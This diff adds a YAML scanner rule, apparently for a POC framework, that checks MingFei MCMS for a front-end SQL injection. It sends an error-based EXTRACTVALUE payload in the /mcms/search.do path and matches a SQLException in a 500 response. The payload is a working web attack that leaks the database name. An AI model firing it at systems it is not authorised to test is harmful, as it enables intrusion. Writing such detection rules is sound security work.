@@ -1,0 +1,11 @@
+name: mingfer-cms-sqli
+rules:
+  - method: GET
+    path: "/mcms/search.do'%20AND%20EXTRACTVALUE(1,CONCAT(0x5c,database()))%20AND%20'smmD'='smmD=1"
+    expression: |
+      response.status == 500 && response.body.bcontains(b"ava.sql.SQLExcepti")
+detail:
+  author: lxy
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  description: "铭飞MCMS前台SQL注入漏洞"
